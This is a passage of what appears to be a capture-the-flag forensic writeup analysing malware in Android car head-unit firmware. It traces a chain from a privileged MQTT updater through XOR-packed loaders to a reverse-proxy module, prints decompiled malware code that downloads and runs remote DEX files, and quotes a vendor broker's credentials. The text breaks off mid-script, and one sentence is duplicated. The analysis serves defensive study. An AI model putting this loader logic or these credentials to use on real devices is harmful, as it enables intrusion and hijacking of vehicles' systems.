<img src="./assets/banner.png" style="max-width: 100%;" align=left />

# Silent Passenger Writeup

9<sup>th</sup> September 2026

Prepared by: Galvatronus

Sherlock Author(s): Galvatronus

Difficulty: <font color="red">Hard</font>

## Scenario

```text
Watson's trail went cold in a rain-soaked underground garage. The only thing left behind was a dismantled motorcar, its dashboard still glowing long after the key had been removed. In his notebook, Mycroft found one unfinished line: "The passenger was never on the manifest."

DIOGENES preserved what remained and constructed a sealed echo of the scene. Sherlock needs you to examine it, follow Watson's trail, and identify the silent passenger before another vehicle leaves the line.
```

## Artifacts Provided

The analyst receives one password-protected archive:

```text
SilentPassenger.zip
Password: hacktheblue
Size:     566,414,513 bytes
SHA256:   79eb225fec45f54d62b32e5b295c31b64c7ce7365017af29be8a1e79936ddcf3
```

Its sole member is the generically named firmware below. All subsequent commands operate on that extracted inner file.

```text
firmware.zip
Size:   566,414,311 bytes
SHA256: 253260f304ebd790d46a8fa4381e6e6cab98bf0c41a13dda2532a43e9d65afda
```

The filename deliberately reveals nothing about the vendor or build. The archive is a rebuilt 2024 head-unit firmware whose embedded APK set is byte-for-byte preserved.

Kaspersky's report, [The invisible passenger in your car](https://securelist.com/android-head-unit-malware/121106/), provides the campaign context: a legitimate TWCore updater delivered JarService, which unpacked a loader, which fetched a clicker/reverse-proxy loader and eventually a zhima module. The exact answers below come from the challenge bytes, not from assuming every example value in the article applies to this selected chain.

## Initial Analysis

### Firmware container and partition recovery

Before looking for malware, establish what the evidence actually contains. The supplied file is not an Android backup or a monolithic disk image; it is a Topway update container holding a change log and three logical Android images. Nothing needs to be flashed or booted.

Start by listing the archive:

```sh
export FIRMWARE='firmware.zip'
sha256sum "$FIRMWARE"
unzip -l "$FIRMWARE"
```

The six members map as follows:

| Member | Size | Interpretation |
| --- | ---: | --- |
| `History.txt` | 7,412 | Vendor change log |
| `597b623a-bf39-11e9-817d-dbcd8bba2407` | 17,166,368 | Topway-wrapped Android boot image |
| `5d1809fc-bf39-11e9-bfdf-cf15c72d75d6` | 67,108,896 | Topway-wrapped 64 MiB ext4 vendor image |
| `5a2f8d64-bf39-11e9-abb7-3733648aa093.0` | 419,430,400 | System stream, first 400 MiB |
| `5a2f8d64-bf39-11e9-abb7-3733648aa093.1` | 419,430,400 | System stream, second 400 MiB |
| `5a2f8d64-bf39-11e9-abb7-3733648aa093.2` | 104,857,604 | Final 100 MiB plus four-byte Topway trailer |

The boot and vendor members are Topway-encrypted images. The three similarly named members are consecutive pieces of the system image. Extract the two wrapped images first:

```sh
unzip -p "$FIRMWARE" History.txt > History.txt
unzip -p "$FIRMWARE" 597b623a-bf39-11e9-817d-dbcd8bba2407 > boot.topway
unzip -p "$FIRMWARE" 5d1809fc-bf39-11e9-bfdf-cf15c72d75d6 > vendor.topway
stat -c '%s bytes  %n' History.txt boot.topway vendor.topway
sha256sum boot.topway vendor.topway
```

Do not remove bytes from the boot or vendor wrappers manually. The public TS10 firmware workbench contains `twt`, a Topway image utility that validates the embedded MD5 before decrypting either image. Use the pinned revision below:

```sh
git clone https://github.com/vanelizarov/ts10_workbench.git
git -C ts10_workbench checkout 40627e87352f6202b4ef053a751856f379ec64a8
TWT='./ts10_workbench/tools/twt'
sha256sum "$TWT"
```

The challenge-tested `twt` SHA-256 is `4622d16ac6514d05e687ffc36ba777dce4bb4df63af46b0ef976a1015f548a34`. Decrypt both wrappers and let `file` identify the results:

```sh
"$TWT" -c decrypt -s boot.topway -d boot.img
"$TWT" -c decrypt -s vendor.topway -d vendor.img
stat -c '%s bytes  %n' boot.img vendor.img
file boot.img vendor.img
sha256sum boot.img vendor.img
```

Expected identities:

```text
boot.img    17,166,336 bytes
SHA256      62febbf132a74af5ffe847cf8b99b3c34b211554a7fb9e9f4e08189fb16bb124
Type        Android boot image, header version 0, page size 2048

vendor.img  67,108,864 bytes
SHA256      20432e357c5d5c2f956e792809d03b9391a0cc6eca015ab49e1156e57d6d975c
Type        ext4, volume name vendor
```

The boot image can be split into its kernel and ramdisk with the AOSP `unpack_bootimg` utility:

```sh
mkdir boot-unpacked
unpack_bootimg --boot_img boot.img --out boot-unpacked
find boot-unpacked -maxdepth 1 -type f -printf '%f  %s bytes\n'
```

The result reports Android 8.1.0, a 16,117,824-byte kernel, a 1,044,386-byte ramdisk, and the command line `selinux=1 androidboot.selinux=permissive buildvariant=eng`.

The vendor filesystem does not need to be mounted. Inspect it read-only with `debugfs`:

```sh
debugfs -R 'ls -l /' vendor.img
debugfs -R 'cat /build.prop' vendor.img > vendor-build.prop
file vendor.img
```

The system recovery path is different because its ext4 bytes are already present directly in the numbered members:

```text
5a2f8d64-bf39-11e9-abb7-3733648aa093.0  419,430,400
5a2f8d64-bf39-11e9-abb7-3733648aa093.1  419,430,400
5a2f8d64-bf39-11e9-abb7-3733648aa093.2  104,857,604
```

Together they are 943,718,404 bytes. The last four bytes are a Topway trailer; the first 943,718,400 bytes are a 900 MiB ext4 system image. Concatenate in numeric order and remove only the trailer:

```sh
: > system.img
for part in 0 1 2; do
  unzip -p "$FIRMWARE" "5a2f8d64-bf39-11e9-abb7-3733648aa093.$part" >> system.img
done
truncate -s 943718400 system.img
file system.img
```

At this point, `file system.img` identifies a Linux ext4 filesystem. Read-only tools such as `debugfs` can inspect it directly, so mounting as root is unnecessary. The firmware has now yielded `boot.img`, `vendor.img`, and `system.img`. It does not contain `userdata`, `cache`, `recovery`, or a full eMMC image. This establishes the available partition boundary before any suspicious application is selected.

### Analysis Sub-Section: TWCore privileged updater

TWCore is a vendor-signed privileged system application, not an obviously named dropper. Its normal responsibilities include device management and software updates. The important behavior is a region-gated MQTT update path: on mainland-configured devices it connects to the vendor broker, subscribes to configuration topics, decodes application-update commands, and installs the APK named by a command. That legitimate update mechanism is the first link in the compromise.

#### Identity, signing, and privilege

The exact APK is `com.tw.core` version `V7.2.2.230316` with version code 79. Its manifest declares `coreApp=true` and the shared UID `android.uid.system`. It targets API 23 on an Android 8.1 firmware and requests package installation, package deletion, force-stop, boot, networking, storage, location, and usage statistics permissions. The archive has valid Android v1 and v2 signatures from a single vendor certificate.

| Property | Value |
| --- | --- |
| APK size | 280,499 bytes |
| MD5 | `543b4b472de345b5fc03eb5bc8db2a1f` |
| SHA-256 | `d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2` |
| Package | `com.tw.core` |
| Android identity | system shared UID, privileged application |

The application resides under `/system/priv-app`, which gives its update logic more significance than an ordinary user-installed APK. Decompiled code shows that its mainland branch requires an absent Google Mobile Services property and an exact `zh_CN` locale. The same branch selects the Cardoor MQTT broker:

#### Regional bootstrap and static initialization

```java
// com.tw.core.utils.I
public String Z() {
    return SystemProperties.get("ro.com.google.gmsversion");
}

// com.tw.core.b.e
private static final String cz = gq();

public static String gq() {
    return DoFunApplication.nt().Z();
}

public static boolean gh() {
    String locale = C0062p.aV(DoFunApplication.nu());
    if (TextUtils.isEmpty(cz)) {
        return "zh_CN".equals(locale);
    }
    return false;
}
```

The predicate does not merely change a label. Endpoint and topic holders are initialized statically, so the locale and GMS property must already be correct when the process starts. The two branches select different Core API bases, MQTT brokers, and topic prefixes:

```java
static {
    if (e.gh()) {
        gZ = J.aI
            ? "https://test.cardoor.cn/core/api/"
            : "http://core.car.cardoor.cn/core/api/";
        gR = J.aI
            ? "tcp://mqtt.car.test.cardoor.cn:1883"
            : "tcp://mqtt.car.cardoor.cn:1883";
    } else {
        gZ = J.aI
            ? "https://overseas.dev.cardoor.cn/core/api/"
            : "http://core.car.dofuncar.com/core/api/";
        gR = J.aI
            ? "tcp://overseas.dev.cardoor.cn:1883"
            : "tcp://mqtt.car.dofuncar.com";
    }
}
```

The untouched firmware boots with `en-US`, vendor language `en`, country `US`, and GMS value `8.1_201808`. The challenge rebuild changes only those property bytes and their containing checksums so this existing mainland branch is reachable. TWCore itself remains byte-for-byte unchanged.

#### MQTT transport and subscriptions

The MQTT client uses Paho with MQTT 3.1.1, clean sessions, QoS 0, and a 300-second keepalive. It subscribes both to a global configuration wildcard and a hardware-derived private topic. Messages are passed to handlers selected by their four-character prefix. Handler `0500` decodes an application update:

| Client option | Effective value |
| --- | --- |
| Broker | `tcp://mqtt.car.cardoor.cn:1883` |
| Credentials | `dofun` / `dofun666666` |
| Protocol | MQTT 3.1.1 |
| Clean session | true |
| Keepalive | 300 seconds |
| Connect timeout | 30 seconds |
| Automatic reconnect | false; application retry loop is used |
| Last Will | none |

After CONNACK, `MainService` subscribes only when the mainland predicate is true. The overseas branch connects but deliberately makes no subscriptions:

```java
if (com.tw.core.b.e.gh()) {
    mqtt.subscribe(
        new String[]{"dofun/car/config/#", "dofun/car/private/" + cid},
        new int[]{0, 0}
    );
} else {
    log("overseas does not subscribe");
}
```

The callback discards the arrived topic, QoS, duplicate flag, and retained flag. It forwards only the payload text to the application dispatcher. The first four characters choose a registered handler, which means either matching subscription can carry an update command.

#### `0500` framing, validation, and installation

The inbound value is not JSON at its outermost layer. It is a fixed-width string containing a handler ID, task ID, replay interval, and URL-safe Base64 JSON:

```java
public static e oc(String value) {
    if (TextUtils.isEmpty(value) || value.length() <= 22) {
        return null;
    }
    return new e(
        value.substring(0, 4),
        value.substring(4, 14),
        1000L * F.cP(F.cQ(value.substring(14, 22)), 4),
        new String(Base64.decode(value.substring(22), 8), "UTF-8")
    );
}
```

| Character range | Purpose |
| --- | --- |
| `0:4` | message identifier |
| `4:14` | opaque ten-character task identifier |
| `14:22` | uppercase hexadecimal interval in seconds |
| `22:` | URL-safe Base64 of UTF-8 JSON |

The decoded application object supplies the target package, version code, download path, expected MD5, installation mode, and several optional rollout gates. The decisive package-absence control is `not_exist_install`. When true, an APK that was never part of the firmware can proceed through the updater. TWCore then checks the downloaded file's case-sensitive MD5, manifest package, and exact version code. It does not pin the download host or APK signer.

For installation type 0 on this API level, TWCore reflectively calls the hidden `PackageManager.installPackage` API with `INSTALL_REPLACE_EXISTING`. Receipt handler `0501` reports the logical states queued, validated, and installed over MQTT. The calls are dispatched through a cached thread pool, so their logical order does not guarantee their network arrival order.

This establishes the first transition: an MQTT value can name an APK URL, package, version, and silent-install behavior handled by a privileged vendor service.

### Analysis Sub-Section: JarService V1.12 carrier

JarService is the APK delivered by the selected `0500` command. Its visible Android service is small because the next stage is concealed as static byte arrays.

#### Android surface and process activation

The APK identifies itself as package `com.tw.jar1`, version name `V1.12`, and version code 12. It has no launcher activity and uses `Theme.NoDisplay`. The manifest names an application class and three components:

| Component | Trigger | Behavior |
| --- | --- | --- |
| `com.tw.jar.App` | every new application process | unconditionally calls the outer loader from `onCreate()` |
| `MainReceiver` | boot and head-unit wake broadcasts | callback is empty; process creation still runs `App.onCreate()` first |
| `MainService` | exported package service action | starts a thread containing an infinite three-second sleep loop |
| `EmptyActivity` | internal activity | starts `MainService`, then finishes |

This distinction matters. The receiver does not visibly download anything, but Android initializes the application object before delivering the receiver callback. Any event that creates the process therefore reaches the embedded loader. The bytes alone do not prove that Android launches the application immediately after TWCore installs it.

The outer APK itself contains no URL, socket, HTTP client, package installer, shell execution, JNI, or native library. Its meaningful work is storage and reflection inside the host application's private directory.

#### Channel derivation and worker entry

`App.onCreate()` starts a worker, which decodes `2039` and passes it as the campaign channel to a reflectively loaded method:

```java
byte[] channel = new byte[]{80, 85, 86, 93};
for (int i = 0; i < channel.length; i++) {
    channel[i] ^= "beed72".charAt(i % 6);
}

Class<?> target = loader.loadClass(metadata.className);
target.getMethod(metadata.methodName, Context.class, String.class)
      .invoke(target, appContext, new String(channel));
```

The four encoded bytes are XORed with only the first four characters of `beed72`; the final two characters are unused. The worker writes below `<filesDir>/.mm/`, deletes any previous `.h.jar`, and reconstructs the carrier on every process initialization.

#### Embedded stream reconstruction

Thirty arrays in classes `com.x.zg.c` through `com.x.zg.l` are decoded in declaration order. Array index `i` uses XOR value `30-i`. The decoded stream begins with Java binary metadata and the rest is a DEX-bearing JAR:

```java
for (int i = 0; i < 30; i++) {
    for (int j = 0; j < blocks[i].length; j++) {
        decoded.write(blocks[i][j] ^ (30 - i));
    }
}

DataInputStream in = new DataInputStream(
    new ByteArrayInputStream(decoded.toByteArray()));
float containerVersion = in.readFloat();
int reserved = in.readInt();
String className = in.readUTF();
String methodName = in.readUTF();
```

The first 29 arrays contain 500 bytes each and the last contains 151 bytes. DEX alignment can make the final array appear to contain a 152nd zero in some tools, but that byte is not part of the Java array. Runtime reconstruction therefore produces exactly 14,651 decoded bytes.

The 25-byte prefix has this structure:

```text
float32  1.2
int32    1
UTF      com.c.j.qbh
UTF      wa
```

Every byte after that prefix is written to `<filesDir>/.mm/.h.jar`. The outer code performs no cryptographic integrity or signature check before handing the file to the Android class loader.

#### First dynamic loading boundary

The worker creates this class loader:

```java
new DexClassLoader(
    filesDir + "/.mm/.h.jar",
    filesDir + "/.mm",
    null,
    ClassLoader.getSystemClassLoader()
);
```

It loads the class named in the serialized header and calls the named static method with the application context and decoded channel. Reconstruction and reflection exceptions are logged and terminate that worker. A later process start will rebuild the JAR and try again.

The metadata identifies `com.c.j.qbh.wa(Context,String)`. This is the outer reflection edge from JarService into loader 1.7.

### Analysis Sub-Section: loader 1.7 delivery layer

The recovered loader fingerprints the host package, reads `.ver`, and falls back to literal version `1.7`.

#### Artifact identity, entry point, and persistence boundary

The reconstructed artifact is a 14,626-byte DEX-bearing JAR with SHA-256 `cf5c8c624967775230573a5a552e2e4e2b3653f2362e8c9b66a801e3b251f37c`. It has no Android manifest component of its own. Persistence remains the responsibility of its JarService host.

Its public entry `wa(Context,String)` stores the caller-supplied channel, starts one worker named `mosdk-host-loader`, and queues a start operation for the next stage. The loader later supplies these arguments to Stage-3:

```text
Application context
null Activity
"2039"
"default"
""
""
```

The activity is null because JarService passes an `Application` context. An alternate convenience entry uses channel `1001`, but the selected carrier does not call it.

#### Private state and version handling

All durable state is under `<filesDir>/.mm/.d/`:

| Name | Purpose |
| --- | --- |
| `.px` | committed downloaded Stage-3 wrapper |
| `.px.tmp` | current download temporary file |
| `.px.bak` | rollback copy of the previous wrapper |
| `.ver` | accepted server-advertised version text |
| `sdk.jar` | decoded archive passed to `DexClassLoader` |

The first line of `.ver` is compared as a Java float. If the file is absent, unreadable, or empty, the loader reports version `1.7`. The float 1.2 in the JarService prefix is unrelated packing metadata, and the selected downloaded stage is version 3.68.

#### Update request and endpoint rotation

The request JSON inventories the loader and its host rather than Stage-3. It contains a persistent name-based UUID, current loader version, type 1, channel, host package name, host version code, and application label:

```json
{
  "userId": "<persistent UUID>",
  "dexVersion": "1.7",
  "dexType": 1,
  "channelId": "2039",
  "packageName": "com.tw.jar1",
  "appVersion": 12,
  "appName": "JarService"
}
```

The loader rotates through four built-in HTTP(S) bases. A preference `KEY_HOST` can prepend additional values, but the recovered code contains no writer for that preference. Unless the selected value contains literal `dex_api.txt`, the loader appends `/apiv2/` and a generated token.

It hides the constant API path in a time-varying 90-character hexadecimal token. The token has two repeating XOR layers, a five-digit decimal value, and a ten-digit epoch:

```java
long epoch = System.currentTimeMillis() / 1000;
int random = new Random().nextInt(90000) + 10000;
String inner = hex(xor(plaintext, String.valueOf(random)));
String frame = inner + "|" + epoch + "|" + random;
String token = hex(xor(frame, "Mu^38Ydeo233Uowd"));
```

The URL token and request body are independent. The token encodes the fixed path `/api/rsaUpdate`; it does not encode or authenticate the JSON body.

#### Asymmetric transport contract

The request and response use raw 1024-bit RSA PKCS#1 v1.5 blocks, but the embedded request-public and response-private material have different moduli. Request plaintext is split into at most 117-byte pieces, each producing a 128-byte ciphertext block. Responses are accepted only as concatenated 128-byte blocks.

Because the client contains only the request public key, these artifacts do not provide the campaign server's request-decryption key. Conversely, the embedded response private key allows the client to decrypt server replies and allows the challenge service to derive the matching public key for faithful responses. This is why the contained service treats client POST bodies as opaque RSA framing instead of pretending to inspect their plaintext.

The update POST helper sets no application-specific headers and reads the response body to EOF without first checking an HTTP response code. Its HTTPS branch disables certificate and hostname verification. The later object GET uses normal platform HTTPS validation, accepts any nonempty body, and performs no hash, signature, MIME, or archive-magic validation.

#### Wrapper transaction and second class loader

After decrypting a successful response, the loader downloads a wrapper whose first byte is a format marker and whose next four bytes are a big-endian float. The remaining bytes are XORed with the low byte of `int(version * 100)`:

```java
DataInputStream in = new DataInputStream(downloadedObject);
byte wrapperType = in.readByte();
int xorKey = (int) (in.readFloat() * 100.0f);
while ((count = in.read(buffer)) != -1) {
    for (int i = 0; i < count; i++) {
        buffer[i] = (byte) (buffer[i] ^ xorKey);
    }
    jar.write(buffer, 0, count);
}
```

The selected header is `01 40 6b 85 1f`: type 1 followed by float 3.68. The effective XOR byte is `0x70`. A successful transaction rotates `.px` through temporary and backup names and writes the advertised version to `.ver`. A decode or class-loading failure removes `.px`, `.ver`, and `sdk.jar` so the cached version cannot remain falsely advanced.

The resulting `sdk.jar` is loaded with the current thread context class loader as parent. The type byte also decodes the class name `com.ast.sdk.BillingMain`. A no-argument instance is wrapped in a Java proxy whose annotated interface forwards `init`, `start`, and `stop` calls. The selected wrapper yields the exact Stage-3 v3.68 archive.

### Analysis Sub-Section: Stage-3 v3.68 task engine

Stage-3 is the control layer. It obtains configuration, registers for a UID, sends an RSA-protected inventory, retrieves task metadata, and requests the script for a selected product.

#### Artifact and lifecycle

The decoded archive is 59,374 bytes with SHA-256 `79e01a591c81554b57e0baaf877ca0a1a1f86f39d38973faa1580089b675838d`. Its entry class is `com.ast.sdk.BillingMain`. During initialization it stores the application context, preserves the supplied numeric channel, creates its main-thread scheduler, and starts a `ServerSocket` on port 12101. Because the listener is constructed without a bind address, it listens on the wildcard interface rather than loopback only.

```java
public void init(Context context, Activity activity, String channel,
                 String unused1, String unused2, String unused3) {
    preferences.putString("appId", channel);
    channelId = Integer.valueOf(channel);
    initialize(context);
}

public void start() {
    running = true;
    handler.postDelayed(taskPoller, 3000L);
}
```

Initialization also deletes stale `<files>/sdk.jar` and `<files>/sdk.dex`, checks for an `openDEBUG` marker, and schedules configuration work after one second. `stop()` shuts down both executor pools, closes the port-12101 bridge, and sends an exit log request.

#### Configuration bootstrap and transport

Stage-3 starts with four task bases, four update bases, task path `/cpc/api/task`, and configuration version 3.8. Its initial query combines that version, RSA mode 1, and the inherited channel 2039:

```java
String target = updateBase
    + "/api/init?configVersion=" + ap.b
    + "&rsa=1&channelId=" + channel;
p response = http.get(target, null);
if (response.status == 200) {
    be.a(context, new String(bb.decrypt(response.body)));
}
```

Primary configuration responses use the same raw 1024-bit RSA block model as the previous stage, but with a separate pair of embedded keys. Request and response keys again have different moduli. A response with code 100 can update task hosts, update hosts, task path, polling interval, and configuration version. A new version is accepted only when its parsed float is greater than the stored value.

The common HTTP client sends a browser-shaped header set including `Accept-Language: zh-CN`, `Accept-Encoding: gzip, deflate, br`, and `User-Agent: okhttp/4.10.0`. It advertises three content encodings but only recognizes and expands a gzip body. HTTPS GET disables both certificate and hostname validation, whereas HTTPS POST disables only hostname validation.

After five primary configuration failures, the client enters a deterministic fallback sweep. Those fallback replies use AES-CBC with a zero IV and a key derived from the final URL path segment. This is an alternate recovery route, not the normal selected path.

#### Registration and local identity bridge

Configuration acceptance starts registration. Stage-3 first queries its local port-12101 bridge using a compact binary message:

```text
u32  25746
u8   101
u32  8
bytes "suid,uid"
```

If a UID already exists, it is appended to the registration request. The client then tries up to three configured task bases at `/cpc/api/proxy/origin`. A successful plaintext JSON response stores its value under `suid/uid`. The local bridge can later return that value to the loader or the sh66 module.

#### Device inventory and task polling

The first task poll runs three seconds after `start()`. The default subsequent interval is 5,400,000 milliseconds, and a configuration response can replace it. Stage-3 builds a detailed device record containing Android identifiers, generated IMEI/IMSI values, Wi-Fi identity, display metrics, build properties, CPU model, user agents, package metadata, channel, Stage-3 version, current configuration version, and the registered UID.

The compact object is RSA-encrypted and sent as `application/octet-stream` to the current task path. Code 200 supplies task records. Code 100 applies another configuration and recursively polls again. Only empty replies consume the three-attempt counter, so repeated nonempty configuration replies can recurse without that bound.

Each task record is keyed by `productId`, `taskId`, a Unix-timestamp-like version, and rank. Unknown or newer products cause a request to `/cpc/api/xml`. Despite that route name, the reply is JSON and its `script` field contains another serialized JSON object. Stage-3 caches the full object under a SharedPreferences key derived from the product ID.

#### Script dispatch and module loading

The script dispatcher contains several similarly named tags. In v3.68, `loadlib` and `loadlib3` are inert, while `loadlib2` parses `url`, `md5`, reflection metadata, arguments, and thread flags. It never reads `url2`:

```java
this.url       = (String) value("url");
this.md5       = (String) value("md5");
this.params    = (JSONArray) value("params");
this.className = (String) value("className");
this.method    = (String) value("method");

downloader.download(task.url, directory, task.md5);
Class<?> loaded = new DexClassLoader(readOnlyCopy, optimizedDirectory,
        null, ClassLoader.getSystemClassLoader()).loadClass(task.className);
loaded.getMethod(task.method, parameterTypes).invoke(loaded, arguments);
```

The task-supplied MD5 is used as a cache filename, not compared with the downloaded bytes. `loadType`, `url2`, and `md52` are likewise ignored by this implementation. Parameters are converted from JSON descriptors into Java types, with the Android `Context` inserted specially. The selected entry can run on its own thread when the task's `thread` Boolean is true.

Other dispatch tags implement configuration changes, reporting, delays, conditional groups, and a WebView-based clicker path. Those behaviors explain why this stage is both a task engine and a module loader rather than merely a single-purpose downloader.

The active task therefore downloads sh66 and invokes its configured entry point through `loadlib2`.

### Analysis Sub-Section: zhima sh66 reverse proxy

sh66 is a DEX-bearing JAR rather than an installable Android application. Its public entry method accepts the Android context, remote host, mode, and four integers.

#### Artifact identity and reflective ABI

The module is 26,135 bytes with SHA-256 `906734ebb9a274c5c83a22a4475e27354857d7b5b62a4ab6bb5d8d365692e963`. It contains `classes.dex` but no Android manifest, resources, native libraries, or independent application component. Stage-3 must load it and call its public static method.

The exact DEX descriptor is:

```text
Lcom/miyc/transfer/Client;->start(
    Landroid/content/Context;
    Ljava/lang/String;
    Ljava/lang/String;
    I I I I
)V
```

The integers are remote command, data, and UDP ports followed by a heartbeat interval:

```java
public static void start(
        Context context, String host, String mode,
        int commandPort, int dataPort, int udpPort, int heartbeatMs) {
    if (mode.equals("off") && isMobile(context)) {
        return;
    }
    start(new k(), host, mode,
          commandPort, dataPort, udpPort, heartbeatMs);
}
```

Mode `off` suppresses startup when the device is on a mobile network. Mode `DEBUG` skips the normal UDP relay worker. Other modes initialize the UID bridge, coordinator, UDP support, and primary command worker.

#### Local coordination and UID retrieval

Before authenticating externally, sh66 retrieves the Stage-3 UID through the binary service on port 12101. It also owns a coordinator on `127.0.0.1:10121`. That coordinator tracks active remote hosts and arbitrates module upgrades by comparing an incoming version with sh66's version 66.

Coordinator operations can query a tracked host, add or remove a host, and transfer tracked tuples to a newer module. These are victim-local lifecycle channels. They are not public HTTP or SOCKS listeners and should not be mistaken for external C2 ports.

#### Primary command channel

The module opens an outbound TCP connection to the task-supplied host on the first integer port. It enables TCP keepalive and `TCP_NODELAY`, then sends an authentication frame. The primary command socket authenticates with marker `0x33`, module version 66, UID length, and UID bytes. Both integers use network byte order: The primary command socket authenticates with marker `0x33`, module version 66, UID length, and UID bytes. Both integers use network byte order:

```java
public static byte[] frame(byte marker, byte[] uid) {
    byte[] out = new byte[uid.length + 9];
    out[0] = marker;
    System.arraycopy(u32be(66), 0, out, 1, 4);
    System.arraycopy(u32be(uid.length), 0, out, 5, 4);
    System.arraycopy(uid, 0, out, 9, uid.length);
    return out;
}
```

The heartbeat thread writes byte `0x34` every configured interval and closes a stale command socket after three intervals without inbound activity. Relevant server commands are:

| Opcode | Meaning |
| --- | --- |
| `0x2d` | SOCKS session plus a secondary channel |
| `0x2e` | HTTP session plus a secondary channel |
| `0x2f` | close the command loop |
| `0x30` | HTTP session |
| `0x31` | SOCKS session |
| `0x34` | heartbeat/activity update |

The secondary variants also connect outward to fixed port 5555 and use a shorter authentication frame. The ordinary selected path needs only the primary channel.

#### Data-channel framing

Commands that create a proxy session carry:

```text
token[4] | reserved[4] | address_u64[8]
```

Only the low 32 bits of the final integer become the IPv4 address. sh66 opens another outbound TCP connection to that address on the second integer port, writes the four-byte token, and waits for proxy-protocol bytes from the remote data service. The third integer port is used by SOCKS UDP relay handling. The fourth integer is time in milliseconds, not a network port.

This framing explains why a single C2 address can host command, data, and UDP roles while the infected unit remains behind NAT.

#### HTTP and SOCKS engines

The HTTP path consumes an HTTP request supplied over the outbound data channel, derives its destination, and relays the resulting connection. The SOCKS path starts directly at a SOCKS5 command request:

```java
if (buffer.get() != 5) {
    fail();
} else {
    byte command = buffer.get();
    buffer.get();
    byte addressType = buffer.get();
    // parse destination and two-byte port
}
```

There is no preceding method-selection state. Bytes such as `05 01 00 01 ...` mean SOCKS version 5, CONNECT, reserved zero, and an IPv4 destination. Sending a conventional `05 NMETHODS METHODS` greeting would be misread as the beginning of a command.

The decisive topology is therefore reversed: sh66 does not expose a public proxy listener on the head unit. It establishes outbound command and data channels, then uses requests supplied by the operator over those channels to originate HTTP or SOCKS traffic from the infected device.

## Questions

Each answer below is derived from the supplied firmware, artifacts earned from the contained lab, and static analysis of the recovered chain.

Set the spawned instance address before running the network commands:

```sh
export LAB_IP='<spawned IPv4>'
test -n "$LAB_IP" || exit 1
```

### 1. Which privileged Android package is responsible for the unauthorized application delivery? Answer in the format `PATH:SHA256`.

**Analysis:**

The filesystem is the Android `/system` mount. Therefore `debugfs` sees paths relative to `/system`; the filesystem-internal path lacks the mount prefix:

```sh
debugfs -R 'ls -l /priv-app/TWCore' system.img
debugfs -R 'dump /priv-app/TWCore/TWCore.apk TWCore.apk' system.img
stat -c '%s bytes' TWCore.apk
md5sum TWCore.apk
sha256sum TWCore.apk
```

Expected identity:

```text
Size:   280,499 bytes
MD5:    543b4b472de345b5fc03eb5bc8db2a1f
SHA256: d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2
Package: com.tw.core
Version: V7.2.2.230316 / versionCode 79
```

The canonical Android path restores the mount prefix.

**Answer:**

```text
/system/priv-app/TWCore/TWCore.apk:d7569563cd0491e76d28a1c6a9929234ffffcf035194d2288d888dced7aa11c2
```

### 2. Which Android system property is evaluated alongside the device locale when TWCore selects its service region?

**Analysis:**

Decompile statically with both a readable Java view and a smali view:

```sh
jadx --show-bad-code -d twcore-jadx TWCore.apk
apktool d -f -o twcore-apktool TWCore.apk
rg -n 'zh_CN|ro\.com\.google\.gmsversion' twcore-jadx twcore-apktool
```

The predicate in `com.tw.core.b.e` returns true only when:

1. `SystemProperties.get("ro.com.google.gmsversion")` is empty; and
2. the active locale string is exactly `zh_CN`.

The JADX names are obfuscated, but the branch itself is direct. The property getter and predicate reduce to:

```java
// com.tw.core.utils.I
public String Z() {
    return SystemProperties.get("ro.com.google.gmsversion");
}

// com.tw.core.b.e
private static final String cz = gq();

public static String gq() {
    return DoFunApplication.nt().Z();
}

public static boolean gh() {
    String locale = C0062p.aV(DoFunApplication.nu());
    if (TextUtils.isEmpty(cz)) {
        return "zh_CN".equals(locale);
    }
    return false;
}
```

The firmware was rebuilt to make that branch coherent without modifying the APK.

**Answer:**

```text
ro.com.google.gmsversion
```

### 3. Which MQTT service and credentials does TWCore use for the affected service region? Answer in the format `URI|USER:PASSWORD`.

**Analysis:**

Trace the production branch of the endpoint holder and the Paho `MqttConnectOptions` builder. `J.aI` is the test/production switch and is false in production. The relevant client facts are:

```java
// com.tw.core.d.a
static {
    if (e.gh()) {
        gR = J.aI
            ? "tcp://mqtt.car.test.cardoor.cn:1883"
            : "tcp://mqtt.car.cardoor.cn:1883";
    } else {
        gR = J.aI
            ? "tcp://overseas.dev.cardoor.cn:1883"
            : "tcp://mqtt.car.dofuncar.com";
    }
}

// com.tw.core.h.b
static {
    iW = J.aI ? "dofuntest" : "dofun";
    iX = J.aI ? "dofuntest" : "dofun666666";
}
```

```text
URI:          tcp://mqtt.car.cardoor.cn:1883
Protocol:     MQTT 3.1.1
Username:     dofun
Password:     dofun666666
Clean session: true
Keepalive:    300 seconds
```

No DNS lookup is needed to answer this.

**Answer:**

```text
tcp://mqtt.car.cardoor.cn:1883|dofun:dofun666666
```

### 4. Which MQTT topic filter exposes update instructions shared with the affected fleet?

**Analysis:**

After a successful mainland connection, TWCore requests QoS 0 for two filters:

```java
// com.tw.core.app.a
iC = e.gh() ? "dofun" : "overseas";
iF = iC + "/car/config/#";
iG = iC + "/car/private/";

// com.tw.core.model.MainService
if (com.tw.core.b.e.gh()) {
    com.tw.core.h.b.nN().nV(
        new String[]{com.tw.core.app.a.iF,
                     com.tw.core.app.a.iG + hardwareCid},
        new int[]{0, 0}
    );
}
```

```text
dofun/car/config/#
dofun/car/private/<hardware-derived CID>
```

The second filter requires device-specific state that is not recoverable from the archive. The configuration wildcard is sufficient for the contained replay. Connect only to the spawned instance and retrieve one retained value:

```sh
mosquitto_sub \
  -h "$LAB_IP" -p 1883 -V mqttv311 \
  -u dofun -P dofun666666 \
  -t 'dofun/car/config/#' -C 1 > retained-command.txt
```

The retained leaf itself is a lab choice; the filter is a binary fact.

**Answer:**

```text
dofun/car/config/#
```

### 5. Which previously absent application was delivered through the updater? Answer in the format `PACKAGE:VERSION_CODE:MD5`.

**Analysis:**

The MQTT value is not JSON. TWCore treats it as a fixed-width Java string:

```java
// com.tw.core.h.e
public static e oc(String value) {
    if (TextUtils.isEmpty(value) || value.length() <= 22) {
        return null;
    }
    return new e(
        value.substring(0, 4),
        value.substring(4, 14),
        1000L * F.cP(F.cQ(value.substring(14, 22)), 4),
        new String(Base64.decode(value.substring(22), 8), "UTF-8")
    );
}

// com.tw.core.i.c
public String je() {
    return "0500";
}
```

```text
offset 0   length 4   message ID
offset 4   length 10  task ID
offset 14  length 8   uppercase hexadecimal interval
offset 22  remainder  URL-safe Base64 JSON
```

Use this inert decoder:

```python
# decode_0500.py
import base64
import json
from pathlib import Path

raw = Path("retained-command.txt").read_text(encoding="utf-8").strip()
